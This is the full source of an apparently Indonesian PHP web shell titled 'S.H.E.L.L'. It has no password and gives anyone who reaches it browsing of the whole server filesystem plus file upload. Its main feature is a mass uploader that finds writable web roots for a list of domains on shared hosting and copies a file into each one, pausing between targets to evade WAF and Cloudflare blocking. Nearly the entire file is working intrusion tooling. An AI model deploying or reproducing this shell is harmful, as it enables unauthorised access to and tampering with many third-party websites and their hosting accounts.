<?php
// Mengatur batas waktu eksekusi skrip menjadi tidak terbatas
set_time_limit(0);

// ⚠️ PERINGATAN KERAS: SHELL INI TIDAK MEMILIKI PASSWORD DAN SANGAT BERBAHAYA.

// --- FUNGSI UPLOAD MASSAL DENGAN JEDA DAN REAL-TIME OUTPUT ---
if (isset($_POST['mass_upload_start'])) {
    
    // Nonaktifkan kompresi output GZIP dan buffer untuk real-time output
    ini_set('zlib.output_compression', 0);
    while (@ob_end_flush());
    ob_implicit_flush(true);
    
    $base_path_input = trim($_POST['base_path']);
    $domain_list_input = trim($_POST['domain_list']);
    
    // 1. Bersihkan Path Induk
    $base_path = realpath($base_path_input);
    if (!$base_path || !is_dir($base_path)) {
         $message_error = "❌ Path Induk tidak valid atau tidak ditemukan.";
         goto end_mass_upload;
    }
    if (substr($base_path, -1) !== DIRECTORY_SEPARATOR) {
        $base_path .= DIRECTORY_SEPARATOR;
    }
    
    // 2. Pisahkan List Domain
    $domains = preg_split("/[\n,]+/", $domain_list_input, -1, PREG_SPLIT_NO_EMPTY);
    $target_paths = [];
    
    // 3. Buat Target Path Lengkap
    // Varian path yang umum digunakan di hosting
    $path_variants = ['', 'public_html', 'htdocs', 'www']; 

    foreach ($domains as $domain) {
        $domain = trim($domain);
        if (empty($domain)) continue;

        foreach ($path_variants as $variant) {
            $potential_path = $base_path . $domain . DIRECTORY_SEPARATOR . $variant;
            $clean_path = realpath($potential_path);
            
            // Verifikasi path, harus ada, dan dapat ditulis (writable)
            if ($clean_path && is_dir($clean_path) && is_writable($clean_path)) {
                if (substr($clean_path, -1) !== DIRECTORY_SEPARATOR) {
                    $clean_path .= DIRECTORY_SEPARATOR;
                }
                $target_paths[] = $clean_path;
            }
        }
    }
    $target_paths = array_unique($target_paths);

    // Cek File yang Diunggah
    $uploaded_file_name = basename($_FILES["fileToMassUpload"]["name"]);
    $uploaded_file_tmp = $_FILES["fileToMassUpload"]["tmp_name"];
    $fileType = strtolower(pathinfo($uploaded_file_name, PATHINFO_EXTENSION));
    
    // Tampilan Proses Terminal
    echo "<pre style='font-family: monospace; background: #000; color: #0f0; padding: 10px;'>";
    echo "================================================\n";
    echo ">> MEMULAI MASS UPLOAD (Jeda 2 Detik/Target) <<\n";
    echo "================================================\n";

    if ($fileType != "txt") {
        $message_error = "\n[ ERROR ] Gagal Mass Upload: Hanya file TXT yang diizinkan.\n";
    } elseif (count($target_paths) === 0) {
        $message_error = "\n[ ERROR ] Tidak ada target domain yang valid dan dapat ditulis ditemukan di Path Induk.\n";
    } else {
        $total_targets = count($target_paths);
        $success_count = 0;
        $counter = 0;
        
        echo "\n[ INFO ] Path Induk: " . $base_path_input . "\n";
        echo "[ INFO ] File: " . $uploaded_file_name . "\n";
        echo "[ INFO ] Target Divalidasi: " . $total_targets . "\n\n";

        foreach ($target_paths as $target_dir) {
            $counter++;
            $final_target = $target_dir . $uploaded_file_name;
            
            echo "[$counter/$total_targets] TARGET: " . $target_dir;
            
            // Jeda waktu 2 detik (Anti-Blokir WAF/Cloudflare)
            sleep(2);
            
            // Lakukan copy file
            if (@copy($uploaded_file_tmp, $final_target)) {
                echo " -- [ BERHASIL ]\n";
                $success_count++;
            } else {
                echo " -- [ GAGAL! ] (Izin ditolak/Gagal)\n";
            }
            flush(); // Real-time output
        }
        
        echo "\n================================================\n";
        echo ">> RINGKASAN:\n";
        echo ">> Berhasil: $success_count\n";
        echo ">> Gagal: " . ($total_targets - $success_count) . "\n";
        echo "================================================\n";
        
        @unlink($uploaded_file_tmp); 
    }
    
    end_mass_upload:
    
    if (isset($message_error)) {
        echo $message_error;
    }
    echo "</pre>";
    exit;
}
// --- AKHIR FUNGSI UPLOAD MASSAL ---


// --- FUNGSI UPLOAD BIASA ---
if (isset($_POST['upload'])) {
    $current_dir = realpath($_POST['current_dir']);
    $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES["fileToUpload"]["name"]);
    $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    if($fileType != "txt") {
        $message = "❌ Gagal: Hanya file TXT yang diizinkan.";
    } elseif (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $message = "✅ File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diunggah ke **" . basename($current_dir) . "**.";
    } else {
        $message = "❌ Gagal mengunggah file.";
    }
}

// --- PENGATURAN PATH (Global Access) ---
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $_SERVER['DOCUMENT_ROOT'];
$current_dir = realpath($current_dir);
if (substr($current_dir, -1) !== DIRECTORY_SEPARATOR) {
    $current_dir .= DIRECTORY_SEPARATOR;
}
if ($current_dir === false) { $current_dir = $_SERVER['DOCUMENT_ROOT']; }
$self_url = basename(__FILE__);
$files = @scandir($current_dir);
// ----------------------------------------
?>
<!DOCTYPE html>
<html>
<head>
    <title>S.H.E.L.L</title>
    <style>
        body { font-family: monospace; background: #fff; color: #000; margin: 10px; }
        .container { max-width: 800px; margin: auto; padding: 0; }
        a { color: #0000ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .success { color: green; font-weight: bold; }
        .error { color: red; font-weight: bold; }
        .file-list { border: 1px solid #000; padding: 5px; max-height: 400px; overflow: auto; }
        .dir-entry { display: block; padding: 2px 0; }
        .dir-entry span { display: inline-block; width: 60px; }
    </style>
</head>
<body>

<div class="container">
    <h2>[ ADMIN ]</h2>

    <?php if (isset($message)): ?>
        <p class="<?php echo strpos($message, '✅') !== false ? 'success' : 'error'; ?>"><?php echo $message; ?></p>
    <?php endif; ?>

    <div>
        PATH: <a href="?dir=<?php echo urlencode(DIRECTORY_SEPARATOR); ?>">/</a>
        <?php
        $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
        $path_link = '';
        foreach ($path_parts as $part) {
            if (empty($part)) continue;
            $path_link .= DIRECTORY_SEPARATOR . $part;
            echo '<a href="?dir=' . urlencode($path_link) . '">' . htmlspecialchars($part) . '</a>/';
        }
        ?>
    </div>
    
    <hr>

    <div class="file-list">
        <?php
        if ($files) {
            usort($files, function($a, $b) use ($current_dir) {
                $is_dir_a = is_dir($current_dir . DIRECTORY_SEPARATOR . $a);
                $is_dir_b = is_dir($current_dir . DIRECTORY_SEPARATOR . $b);
                if ($is_dir_a == $is_dir_b) return strcasecmp($a, $b); 
                return $is_dir_a ? -1 : 1; 
            });

            foreach ($files as $file) {
                $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
                $is_dir = is_dir($full_path);
                
                if ($file == '.') continue;
                
                if ($is_dir || $file == '..') {
                    $new_dir = ($file == '..') ? dirname($current_dir) : $full_path;
                    $link = $self_url . '?dir=' . urlencode($new_dir);
                } else {
                    $link = '#';
                }
                
                $size = $is_dir ? 'DIR' : round(@filesize($full_path) / 1024, 2) . ' KB';
                $perms = substr(sprintf('%o', @fileperms($full_path)), -4);

                echo '<div class="dir-entry">';
                echo '<span>' . $perms . '</span>';
                echo '<span>' . $size . '</span>';
                echo $is_dir || $file == '..' ? '<a href="' . $link . '"><b>' . htmlspecialchars($file) . '/</b></a>' : htmlspecialchars($file);
                echo '</div>';
            }
        }
        ?>
    </div>

    <hr>

    <div>
        <h3>[ UPLOAD (Saja) ]</h3>
        <form action="<?php echo $self_url . '?dir=' . urlencode($current_dir); ?>" method="post" enctype="multipart/form-data">
            <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="file" name="fileToUpload" accept=".txt" required>
            <input type="submit" value="Upload TXT Ke Folder Ini" name="upload">
        </form>
    </div>

    <hr>

    <div>
        <h3>[ MASS UPLOAD GABUNGAN ]</h3>
        <form action="" method="post" enctype="multipart/form-data">
            <p>1. Masukkan **Path Induk** (Lokasi Umum Domain):</p>
            <input type="text" name="base_path" size="50" required placeholder="/home/sites/ atau /var/www/vhosts/" value="<?php echo htmlspecialchars($current_dir); ?>">
            
            <p>2. Masukkan **List Nama Domain** (pisah dengan baris baru):</p>
            <textarea name="domain_list" rows="5" cols="50" required placeholder="domain1.com
domain2.com
domain3.org"></textarea>
            
            <br><br>
            <input type="file" name="fileToMassUpload" accept=".txt" required>
            <input type="submit" value="🔥 MASS UPLOAD (.TXT) KE SEMUA DOMAIN" name="mass_upload_start" style="background-color: red; color: white; font-weight: bold;">
            <p style="font-size:12px;">*Skrip akan mencari path domain di bawah Path Induk, dengan jeda 2 detik per target.</p>
        </form>
    </div>

</div>

</body>
</html>
